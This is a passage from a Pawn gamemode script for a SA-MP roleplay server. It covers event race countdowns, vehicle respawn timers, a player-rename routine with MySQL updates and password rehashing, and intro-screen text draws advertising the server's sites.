			Uze[ playerid ] = true;
		}
		case 4:
		{
            SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* Sat je nadjen u kontejneru (( %s ))", ImeIgraca( playerid ));
			PlayerInfo[ playerid ][ xSat ] = 19039;
			sql_user_update_integer( playerid, "watch", PlayerInfo[ playerid ][ xSat ] );
		}
	}

	TrashSearch[ playerid ] = 0;
	ClearAnimations( playerid );
	SMG_TogglePlayerControllable( playerid, true );
	return 1;
}
//------------------------------------------------------------------------------
public OnVehicleDamageStatusUpdate( vehicleid, playerid )
{
    return 1;
}
//------------------------------------------------------------------------------
_:public UpdatePlayerGps(playerid, fresh)
{
	new bool:arrived = false;
	if( IsPlayerInRangeOfPoint( playerid, 20.0, PlayerGpsRadar[ playerid ][_pgrPos][ 0 ], PlayerGpsRadar[ playerid ][_pgrPos][ 1 ], PlayerGpsRadar[ playerid ][_pgrPos][ 2 ] ) )
	{
		arrived = true;
		if( IsValidDynamicMapIcon(PlayerGpsRadar[ playerid ][_pgrIconId ] ) ) DestroyDynamicMapIcon(PlayerGpsRadar[ playerid ][_pgrIconId] );

		PlayerGpsRadar[ playerid ][_pgrIconId] = -1;
	}

	if(!arrived)
	{
        if( PlayerInfo[ playerid ][ xGpsLevel ] >= 2 )
		{
            if( IsPlayerInAnyVehicle( playerid ) )
			{
                new Float:x2 = PlayerGpsRadar[ playerid ][_pgrPos][ 0 ],
					Float:y2 = PlayerGpsRadar[ playerid ][_pgrPos][ 1 ],
			    	Float:VPos[ 3 ],
			    	Float:Rotation;

		 		GetVehiclePos( GetPlayerVehicleID( playerid ), VPos[ 0 ], VPos[ 1 ], VPos[ 2 ] );
		 		Rotation = PointAngle( playerid, VPos[ 0 ], VPos[ 1 ], x2, y2 );
				AttachDynamicObjectToVehicle( PlayerGpsRadar[ playerid ][ _pgrObject ], GetPlayerVehicleID( playerid ), 0.0, 0.0, 1.5, 0.0, 90.0, Rotation );
			}
        }
		SetPlayerTimerEx(playerid, "UpdatePlayerGps", 100, false, "ii", playerid, 0);
	}
	else
	{
        DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] );
        DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
        PlayerGpsRadar[ playerid ][ _pgrIconId ] = -1;
        PlayerGpsRadar[ playerid ][ _pgrObject ] = -1;
	}
}

_:public GetPlayerBusinessId( playerid, type )
{
	foreach(new i : iter_Bizz)
	{
		if( IsPlayerInRangeOfPoint( playerid, 50.0, BusinessInfo[ i ][ bExitX ], BusinessInfo[ i ][ bExitY ], BusinessInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BusinessInfo[ i ][ bInVW ] )
        {
            if( BusinessInfo[ i ][ bType ] == type )
            {
				return i;
			}
		}
	}
	return -1;
}
//------------------------------------------------------------------------------
_:public EventTimeR()
{
	if( EventInfo[ Started ] == event_STUNT && EventInfo[ EventTime ] > 0 )
	{
	   	EventInfo[ EventTime ]--;
        switch( EventInfo[ EventTime ] )
		{
	    	case 0:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_STUNT )
					{
						SMG_TogglePlayerControllable( i, true );
						GameTextForPlayer( i ,"~g~GO GO GO!!!", 2000, 5 );
						SetPlayerRaceCheckpoint(i, 0, 
															StuntRace_CP[PlayerCP[i]][0], StuntRace_CP[PlayerCP[i]][1], StuntRace_CP[PlayerCP[i]][2],
															StuntRace_CP[PlayerCP[i] + 1][0], StuntRace_CP[PlayerCP[i] + 1][1], StuntRace_CP[PlayerCP[i] + 1][2], 5.0);
					}
				}
			}
			case 1:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_STUNT )
					{
					    GameTextForPlayer( i ,"~r~1", 1500, 5 );
					}
				}
			}
			case 2:
			{
			    foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_STUNT )
					{
					    GameTextForPlayer( i ,"~y~2", 1500, 5 );
					}
				}
			}
			case 3:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_STUNT )
					{
					    GameTextForPlayer( i ,"~b~3", 1500, 5 );
					}
				}
			}
			case 8:
			{
			    SendClientMessageToAll( 0x6EF83CFF, "(EVENT - STUNT RACE): Event prijave se zavrsavaju za {FFFFFF}(5) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 13:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - STUNT RACE): Event prijave se zavrsavaju za {FFFFFF}(10) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 18:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - STUNT RACE): Event prijave se zavrsavaju za {FFFFFF}(15) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
		}
	}
	//////////////////////////////////
	else if( EventInfo[ Started ] == event_JETPACK && EventInfo[ EventTime ] > 0 )
	{
	   	EventInfo[ EventTime ]--;
        switch( EventInfo[ EventTime ] )
		{
	    	case 0:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_JETPACK )
					{
						SMG_TogglePlayerControllable( i, true );
						SetPlayerSpecialAction( i, SPECIAL_ACTION_USEJETPACK );
						GameTextForPlayer( i ,"~g~GO GO GO!!!", 2000, 5 );
						SetPlayerRaceCheckpoint(i, 3, 
														JetpackRace_CP[PlayerCP[i]][0], JetpackRace_CP[PlayerCP[i]][1], JetpackRace_CP[PlayerCP[i]][2], 
														JetpackRace_CP[PlayerCP[i] + 1][0], JetpackRace_CP[PlayerCP[i] + 1][1], JetpackRace_CP[PlayerCP[i] + 1][2], 5.0);
					}
				}
			}
			case 1:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_JETPACK )
					{
					    GameTextForPlayer( i ,"~r~1", 1500, 5 );
					}
				}
			}
			case 2:
			{
			    foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_JETPACK )
					{
					    GameTextForPlayer( i ,"~y~2", 1500, 5 );
					}
				}
			}
			case 3:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_JETPACK )
					{
					    GameTextForPlayer( i ,"~b~3", 1500, 5 );
					}
				}
			}
			case 8:
			{
			    SendClientMessageToAll( 0x6EF83CFF, "(EVENT - JETPACK RACE): Event prijave se zavrsavaju za {FFFFFF}(5) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 13:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - JETPACK RACE): Event prijave se zavrsavaju za {FFFFFF}(10) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 18:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - JETPACK RACE): Event prijave se zavrsavaju za {FFFFFF}(15) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
		}
	}
	//////////////////////////////////
	if( EventInfo[ Started ] == event_DRAG && EventInfo[ EventTime ] > 0 )
	{
	   	EventInfo[ EventTime ]--;
        switch( EventInfo[ EventTime ] )
		{
	    	case 0:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_DRAG )
					{
						SMG_TogglePlayerControllable( i, true );
						GameTextForPlayer( i ,"~g~GO GO GO!!!", 2000, 5 );
						SetPlayerRaceCheckpoint(i, 0, 
														DragRace_CP[PlayerCP[i]][0], DragRace_CP[PlayerCP[i]][1], DragRace_CP[PlayerCP[i]][2], 
														DragRace_CP[PlayerCP[i] + 1][0], DragRace_CP[PlayerCP[i] + 1][1], DragRace_CP[PlayerCP[i] + 1][2], 5.0);
					}
				}
			}
			case 1:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_DRAG )
					{
					    GameTextForPlayer( i ,"~r~1", 1500, 5 );
					}
				}
			}
			case 2:
			{
			    foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_DRAG )
					{
					    GameTextForPlayer( i ,"~y~2", 1500, 5 );
					}
				}
			}
			case 3:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_DRAG )
					{
					    GameTextForPlayer( i ,"~b~3", 1500, 5 );
					}
				}
			}
			case 8:
			{
			    SendClientMessageToAll( 0x6EF83CFF, "(EVENT - DRAG RACE): Event prijave se zavrsavaju za {FFFFFF}(5) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 13:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - DRAG RACE): Event prijave se zavrsavaju za {FFFFFF}(10) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 18:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - DRAG RACE): Event prijave se zavrsavaju za {FFFFFF}(15) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
		}
	}
	//////////////////////////////////
	if( EventInfo[ Started ] == event_TEMPLERUN && EventInfo[ EventTime ] > 0 )
	{
	   	EventInfo[ EventTime ]--;
        switch( EventInfo[ EventTime ] )
		{
	    	case 0:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_TEMPLERUN )
					{
						SMG_TogglePlayerControllable( i, true );
						GameTextForPlayer( i ,"~g~GO GO GO!!!", 2000, 5 );
					}
				}
			}
			case 1:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_TEMPLERUN )
					{
					    GameTextForPlayer( i ,"~r~1", 1500, 5 );
					}
				}
			}
			case 2:
			{
			    foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_TEMPLERUN )
					{
					    GameTextForPlayer( i ,"~y~2", 1500, 5 );
					}
				}
			}
			case 3:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_TEMPLERUN )
					{
					    GameTextForPlayer( i ,"~b~3", 1500, 5 );
					}
				}
			}
			case 8:
			{
			    SendClientMessageToAll( 0x6EF83CFF, "(EVENT - TEMPLE RUN): Event prijave se zavrsavaju za {FFFFFF}(5) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 13:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - TEMPLE RUN): Event prijave se zavrsavaju za {FFFFFF}(10) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 18:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - TEMPLE RUN): Event prijave se zavrsavaju za {FFFFFF}(15) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
		}
	}
	if( EventInfo[ Started ] == event_LIVE && EventInfo[ EventTime ] > 0 )
	{
	   	EventInfo[ EventTime ]--;
        switch( EventInfo[ EventTime ] )
		{
	    	case 0:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_LIVE )
					{
						SMG_TogglePlayerControllable( i, true );
						GameTextForPlayer( i ,"~r~SACEKAJTE ADMINA ZA~n~OSTALA UPUSTVA!!!", 8000, 5 );
					}
				}
			}
			case 1:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_LIVE )
					{
					    GameTextForPlayer( i ,"~r~1", 1500, 5 );
					}
				}
			}
			case 2:
			{
			    foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_LIVE )
					{
					    GameTextForPlayer( i ,"~y~2", 1500, 5 );
					}
				}
			}
			case 3:
			{
				foreach( new i : Player)
				{
					if( PlayerInvited[ i ] == event_LIVE )
					{
					    GameTextForPlayer( i ,"~b~3", 1500, 5 );
					}
				}
			}
			case 8:
			{
			    SendClientMessageToAll( 0x6EF83CFF, "(EVENT - LIVE EVENT): Event prijave se zavrsavaju za {FFFFFF}(5) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 13:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - LIVE EVENT): Event prijave se zavrsavaju za {FFFFFF}(10) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 18:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - LIVE EVENT): Event prijave se zavrsavaju za {FFFFFF}(15) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 33:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - LIVE EVENT): Event prijave se zavrsavaju za {FFFFFF}(30) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
			case 63:
			{
				SendClientMessageToAll( 0x6EF83CFF, "(EVENT - LIVE EVENT): Event prijave se zavrsavaju za {FFFFFF}(60) {6EF83C}sekundi. {FFFFFF}[ /join ]" );
			}
		}
	}
}
//------------------------------------------------------------------------------
_:public TimerIzazov(playerid)
{
	if( TrkaIzazov[ playerid ] != 0 )
	{
	    TrkaIzazov[ playerid ]--;
	    switch( TrkaIzazov[ playerid ] )
		{
			case 0:
			{
			    SetPlayerRaceCheckpoint( playerid, 0, -1431.3984, -129.8569, 1045.4110, -1456.4524, -282.5754, 1050.6942, 7.0 );
				TrkaCheckpoint[ playerid ] = 1;
				KillTimer(IzazivanjeTimer[ playerid ]);
				SMG_TogglePlayerControllable( playerid, true );
				GameTextForPlayer( playerid, "~g~GO GO GO!!!", 2000, 5 );
			}
			case 1:
			{
			    GameTextForPlayer( playerid, "~r~1", 1500, 5 );
			}
			case 2:
			{
			    GameTextForPlayer( playerid, "~y~2", 1500, 5 );
			}
			case 3:
			{
			    GameTextForPlayer( playerid, "~b~3", 1500, 5 );
			}
		}
	}
}
//------------------------------------------------------------------------------
_:public VehicleOrgRespawn(vehicleid, provjera)
{
	if(provjera == 1)
	{
	    foreach( new i : Player)
		{
			if( IsPlayerInAnyVehicle( i ) )
			{
				if( !occupied[ GetPlayerVehicleID( i ) ] ) occupied[ GetPlayerVehicleID( i ) ] = true;
			}
		}
		SetTimerEx_("VehicleOrgRespawn", 2000, 2000, 1, "ii", 0, 0);
	}
	else
	{
		if( vehicleid != IVI )
		{
	 		if( VehicleInfo[ vehicleid ][ vUsage ] != ORGANIZACIJSKO_VOZILO ) occupied[ vehicleid ] = true;
			if( IsTrailerAttachedToVehicle( vehicleid ) ) occupied[ GetVehicleTrailer( vehicleid ) ] = true;
	   		if( !occupied[ vehicleid ] )
	  		{
	   			SetVehicleToRespawn( vehicleid );
	      	}
	  		else occupied[ vehicleid ] = false;
	   	}
	   	if( vehicleid+1 <= GetVehiclePoolSize() ) SetTimerEx_("VehicleOrgRespawn", 10, 10, 1, "ii", vehicleid+1, 0);
	   	else ServerInfo[ RRVehicle ] = false, SendClientMessageToAll( 0x41BAB4FF, "(RESPAWN): Respawn organizacijskih vozila zavrsen." );
	}
    return 1;
}

_:public VehiclePrivateRespawn( vehicleid, provjera )
{
    if(provjera == 1)
	{
	    foreach( new i : Player)
		{
			if( IsPlayerInAnyVehicle( i ) )
			{
				if( !occupied[ GetPlayerVehicleID( i ) ] ) occupied[ GetPlayerVehicleID( i ) ] = true;
			}
		}
		SetTimerEx_("VehiclePrivateRespawn", 2000, 2000, 1, "ii", 0, 0);
	}
	else
	{
		if( vehicleid != IVI )
		{
	 		if( VehicleInfo[ vehicleid ][ vUsage ] != PRIVATNO_VOZILO ) occupied[ vehicleid ] = true;
			if( IsTrailerAttachedToVehicle( vehicleid ) ) occupied[ GetVehicleTrailer( vehicleid ) ] = true;
	  		if( !occupied[ vehicleid ] )
	  		{
	   			SetVehicleToRespawn( vehicleid );
	      	}
	  		else occupied[ vehicleid ] = false;
	    }
	   	if( vehicleid+1 <= GetVehiclePoolSize() ) SetTimerEx_("VehiclePrivateRespawn", 10, 10, 1, "ii", vehicleid+1, 0);
	    else ServerInfo[ RRVehicle ] = false, SendClientMessageToAll( 0x41BAB4FF, "(RESPAWN): Respawn privatnih vozila zavrsen." );
	}
   	return 1;
}

_:public VehicleRespawn( vehicleid, provjera )
{
    if(provjera == 1)
	{
	    foreach( new i : Player)
		{
			if( IsPlayerInAnyVehicle( i ) )
			{
				if( !occupied[ GetPlayerVehicleID( i ) ] ) occupied[ GetPlayerVehicleID( i ) ] = true;
			}
		}
		SetTimerEx_("VehicleRespawn", 2000, 2000, 1, "ii", 0, 0);
	}
	else
	{
		if( vehicleid != IVI )
		{
	   		if( !occupied[ vehicleid ] )
			{
	           	SetVehicleToRespawn( vehicleid );
	  		}
	  		else occupied[ vehicleid ] = false;
		}
	 	if( vehicleid+1 <= GetVehiclePoolSize() ) SetTimerEx_("VehicleRespawn", 10, 10, 1, "ii", vehicleid+1, 0);
	  	else ServerInfo[ RRVehicle ] = false, SendClientMessageToAll( 0x41BAB4FF, "(RESPAWN): Respawn svih vozila zavrsen." );
	}
   	return 1;
}
//------------------------------------------------------------------------------
IsACabrio(model)
{
	if(	model == 424 || model == 429 || model == 430 || model == 439 || model == 446 ||
		model == 448 || model == 452 || model == 453 || model == 454 || model == 457 ||
		model == 461 || model == 462 || model == 463 || model == 468 || model == 471 ||
		model == 472 || model == 473 || model == 476 || model == 480 || model == 481 ||
		model == 484 || model == 485 || model == 486 || model == 493 || model == 500 ||
		model == 506 || model == 509 || model == 510 || model == 512 || model == 513 ||
		model == 521 || model == 522 || model == 523 || model == 530 || model == 531 ||
		model == 533 || model == 536 || model == 539 || model == 555 || model == 567 ||
		model == 568 || model == 571 || model == 572 || model == 575 || model == 581 ||
		model == 586 )
	{
		return 1;
	}
	return(false);
}

//------------------------------------------------------------------------------
RenamePlayer( staroime[], name[], playerid )
{
	new imovina1 = PlayerInfo[ playerid ][ xProperty ][ 0 ],
		imovina2 = PlayerInfo[ playerid ][ xProperty ][ 1 ],
		imovina3 = PlayerInfo[ playerid ][ xProperty ][ 2 ],
		firma = PlayerInfo[ playerid ][ xFirmaID ];

	if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 && strcmp( staroime, II[ imovina1 ][ iOwner ], true) == 0)
	{
	    strmid( II[ imovina1 ][ iOwner ], name, 0, strlen( name ), 24 );
		PropertyRefresh( imovina1 );
		SaveProperty( imovina1 );
	}
	if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 && strcmp( staroime, II[ imovina2 ][ iOwner ], true) == 0)
	{
	    strmid( II[ imovina2 ][ iOwner ], name, 0, strlen( name ), 24 );
		PropertyRefresh( imovina2 );
		SaveProperty( imovina2 );
	}
	if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 && strcmp( staroime, II[ imovina3 ][ iOwner ], true) == 0)
	{
	    strmid( II[ imovina3 ][ iOwner ], name, 0, strlen( name ), 24 );
		PropertyRefresh( imovina3 );
		SaveProperty( imovina3 );
	}
	if( PlayerInfo[ playerid ][ xFirmaID ] != -1 && strcmp( staroime, BusinessInfo[ firma ][ bOwner ], true) == 0)
	{
	    strmid( BusinessInfo[ firma ][ bOwner ], name, 0, strlen( name ), 24 );
		Bussines_Refresh( firma );
		new q[ 100 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `bOwner` = '%s' WHERE `bussines_id` = '%d'", BusinessInfo[ firma ][ bOwner ], BusinessInfo[ firma ][ b_ID ] );
	    mysql_tquery( mSQL, q );
	}

	for( new j = 0; j < MAX_VEH_SLOT; j++ )
	{
	    if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 && strcmp( staroime, VehicleInfo[ player_veh[ playerid ][ vehicle_id ][ j ] ][ vOwner ], true) == 0)
		{
			strmid( VehicleInfo[ player_veh[ playerid ][ vehicle_id ][ j ] ][ vOwner ], name, 0, strlen( name ), 24 );
		}
	}

	SetPlayerName( playerid, name );

	new hash_pass[ 64 ];
	SHA256_PassHash( accountRealPass[ playerid ], ImeIgraca(playerid), hash_pass, sizeof hash_pass );
	strmid( PlayerInfo[ playerid ][ xLozinka ], hash_pass, 0, strlen( hash_pass ), 255 );

	new q[ 200 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `p_name` = '%e', `password` = '%e' WHERE `user_id` = '%d' LIMIT 1", name, PlayerInfo[ playerid ][ xLozinka ], PlayerInfo[ playerid ][ xID ] );
	mysql_tquery( mSQL, q );
	return 1;
}
//------------------------------------------------------------------------------
_:public ClearKnock( playerid )
{
	SMG_TogglePlayerControllable( playerid, true );
	ClearAnimations( playerid );
 	KnockedDown[ playerid ] = false;
}
//------------------------------------------------------------------------------
_:public ClearPlayerRob( playerid )
{
 	IgracOpljackan[ playerid ] = false;
}
//------------------------------------------------------------------------------
ControlIntroTextDraws(playerid, bool:show)
{
	if(show)
	{
		ServerIntro_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 199.211318, 49.626739, "box");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][0], 0.000000, 9.822216);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][0], 436.100128, 0.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, ServerIntro_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, ServerIntro_pTD[playerid][0], 90);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][0], 0);

		ServerIntro_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 194.777786, 127.622215, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][1], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][1], 246.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][1], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][1], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][1], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][1], 0);

		ServerIntro_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 283.822082, 140.019989, "WWW.ULTIMATE-RPG.COM");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][2], 0.132440, 0.628933);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][2], 1064746239);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][2], 2);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][2], 0);

		ServerIntro_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 206.888854, 59.199966, "_");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][3], 0.135995, 0.679022);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][3], -1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][3], 2);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][3], 0);

		ServerIntro_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 381.377593, 120.808868, "_");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][4], 0.132440, 0.628933);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][4], 3);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][4], 1064746239);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][4], 2);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][4], 0);

		ServerIntro_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 317.176910, 128.947387, "ultimate community 2018 - 2020 (c) sva prava zadrzana");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][5], 0.132440, 0.628933);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][5], 2);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][5], -1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][5], 2);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][5], 0);

		ServerIntro_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 191.833175, 104.724441, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][6], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][6], 74.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][6], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][6], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][6], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][6], 0);

		ServerIntro_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 369.989257, 104.826629, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][7], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][7], 75.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][7], 1115865343);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][7], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][7], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][7], 0);

		ServerIntro_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 265.888763, 104.926628, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][8], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ServerIntro_pTD[playerid][8], 104.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][8], 1);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][8], 65);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][8], 4);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][8], 0);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][8], 0);

		ServerIntro_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 229.344100, 105.966674, "discord.ultimate-rpg.com");
		PlayerTextDrawLetterSize(playerid, ServerIntro_pTD[playerid][9], 0.115106, 0.649895);
		PlayerTextDrawAlignment(playerid, ServerIntro_pTD[playerid][9], 2);
		PlayerTextDrawColor(playerid, ServerIntro_pTD[playerid][9], -1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, ServerIntro_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, ServerIntro_pTD[playerid][9], 255);
		PlayerTextDrawFont(playerid, ServerIntro_pTD[playerid][9], 2);
		PlayerTextDrawSetProportional(playerid, ServerIntro_pTD[playerid][9], 1);
		PlayerTextDrawSetShadow(playerid, ServerIntro_pTD[playerid][9], 0);

		ServerIntro_pTD[playerid][10] = CreatePlayerTextDraw(playerid, 407.554962, 105.966674, "ts3.ultimate-rpg.com");
